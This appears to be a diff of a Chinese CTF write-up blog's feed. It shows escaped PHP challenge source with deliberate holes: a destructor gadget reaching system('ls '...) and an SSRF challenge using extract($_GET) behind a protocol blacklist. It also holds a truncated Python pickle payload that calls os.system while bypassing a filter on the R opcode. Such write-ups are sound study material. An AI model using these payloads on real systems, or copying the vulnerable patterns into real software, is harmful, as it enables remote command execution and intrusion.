class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;ip,&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;user,&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;password);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($m-&amp;gt;connect_error)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;($m-&amp;gt;connect_error);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $m-&amp;gt;options(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;option,&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $result=$m-&amp;gt;query(&lt;span class=&quot;string&quot;&gt;&#39;select 1;&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($result-&amp;gt;num_rows&amp;gt;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;测试完毕，数据库服务器处于开启状态&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;测试完毕,数据库服务器未开启&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;File&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; $uploadfile;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__construct&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($filename)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;uploadfile=$filename;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;xs&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;请求结束&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Fileupload&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; $file;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__construct&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($file)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file = $file;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;deal&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $extensionarr=&lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;gif&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;jpeg&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;jpg&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;png&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $extension = pathinfo(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file-&amp;gt;uploadfile[&lt;span class=&quot;string&quot;&gt;&#39;name&#39;&lt;/span&gt;], PATHINFO_EXTENSION);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $type = &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file-&amp;gt;uploadfile[&lt;span class=&quot;string&quot;&gt;&#39;type&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;//echo &quot;type: &quot;.$type;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $filetypearr=&lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;image/jpeg&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;image/png&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;image/gif&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(in_array($extension,$extensionarr)&amp;amp;in_array($type,$filetypearr)&amp;amp;&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file-&amp;gt;uploadfile[&lt;span class=&quot;string&quot;&gt;&quot;size&quot;&lt;/span&gt;]&amp;lt;&lt;span class=&quot;number&quot;&gt;204800&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ($_FILES[&lt;span class=&quot;string&quot;&gt;&quot;file&quot;&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;&quot;error&quot;&lt;/span&gt;] &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;错误：: &quot;&lt;/span&gt; .&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file-&amp;gt;uploadfile[&lt;span class=&quot;string&quot;&gt;&quot;error&quot;&lt;/span&gt;] . &lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!is_dir(&lt;span class=&quot;string&quot;&gt;&quot;./uploads/&quot;&lt;/span&gt;.md5($_SERVER[&lt;span class=&quot;string&quot;&gt;&#39;REMOTE_ADDR&#39;&lt;/span&gt;]).&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    mkdir(&lt;span class=&quot;string&quot;&gt;&quot;./uploads/&quot;&lt;/span&gt;.md5($_SERVER[&lt;span class=&quot;string&quot;&gt;&#39;REMOTE_ADDR&#39;&lt;/span&gt;]).&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                $upload_dir=&lt;span class=&quot;string&quot;&gt;&quot;./uploads/&quot;&lt;/span&gt;.md5($_SERVER[&lt;span class=&quot;string&quot;&gt;&#39;REMOTE_ADDR&#39;&lt;/span&gt;]).&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                move_uploaded_file(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file-&amp;gt;uploadfile[&lt;span class=&quot;string&quot;&gt;&quot;tmp_name&quot;&lt;/span&gt;],$upload_dir.md5(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file-&amp;gt;uploadfile[&lt;span class=&quot;string&quot;&gt;&#39;name&#39;&lt;/span&gt;]).&lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;.$extension);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;上传成功&quot;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;不被允许的文件类型&quot;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file-&amp;gt;xs();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Listfile&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; $file;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__construct&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($file)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file=$file;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;listdir&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        system(&lt;span class=&quot;string&quot;&gt;&quot;ls &quot;&lt;/span&gt;.&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file).&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__call&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($name, $arguments)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        system(&lt;span class=&quot;string&quot;&gt;&quot;ls &quot;&lt;/span&gt;.&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+      部分源码
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+
+
+php
+e
     
     </summary>
     
@@ -393,8 +805,16 @@ v1 += 3;
     
     <summary type="html">
     
-      &lt;p&gt;过滤了&lt;code&gt;R&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/89132768&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;从零开始python反序列化攻击：pickle原理解析 &amp;amp; 不用reduce的RCE姿势&lt;/a&gt;&lt;/p&gt;
+      过滤了R
+
+从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势
+
+一开始考虑RCE
+
+1
+
+
+b&#39;\x80\x03c__main__\nAnimal\n)\x81}(V__setstate__\ncos\nsystem\nubVls /\nb0c__main__\nAnimal\n)\x81}(X\x04\x00\x00\x00nameq\x03X\x14\x00\x00\x00\xe4\xb8\x80\xe7\xbb\x99\xe6\x88\x91\xe5\x93\xa9giaogiaoq\x04X\x08\x00\x00\x00categoryq\x0
     
     </summary>
     
@@ -419,8 +839,52 @@ v1 += 3;
     
     <summary type="html">
     
-      &lt;p&gt;访问直接给了题目源码👇&lt;/p&gt;
-&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;error_reporting(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&#39;head&#39;&lt;/span&gt;])&amp;amp;&amp;amp;&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&#39;url&#39;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    $begin = &lt;span class=&quot;string&quot;&gt;&quot;The number you want: &quot;&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    extract($_GET);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($head == &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;Where is your head?&#39;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;string&quot;&gt;&#39;/[A-Za-z0-9]/i&#39;&lt;/span&gt;,$head))&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        die(&#39;Head can\&#39;t be like this!&#39;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if(preg_match(&#39;/log/i&#39;,$url))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        die(&#39;No No No&#39;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if(preg_match(&#39;/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i&#39;,$url))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;Don\&#39;t use strange protocol!&#39;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    $funcname = $head.&lt;span class=&quot;string&quot;&gt;&#39;curl_init&#39;&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    $ch = $funcname();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($ch)&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        curl_setopt($ch, CURLOPT_URL, $url);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        curl_setopt($ch, CURLOPT_RETURNTRANSFER, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        $output = curl_exec($ch);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        curl_close($ch);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        $output = &lt;span class=&quot;string&quot;&gt;&#39;rua&#39;&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; sprintf($begin.&lt;span class=&quot;string&quot;&gt;&#39;%d&#39;&lt;/span&gt;,$output);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    show_source(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+      访问直接给了题目源码👇
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+
+
+ php
+error_reporting(0);
+if(isset($_GET[&#39;head&#39;])&amp;&amp;isset($_GET[&#39;url&#39;])){
+    $begin = &quot;The number you want: &quot;;
+    extract($_GET);
+    if($head == &#39;&#39;){
+        die(&#39;Where is your head?&#39;);
+  
     
     </summary>
     
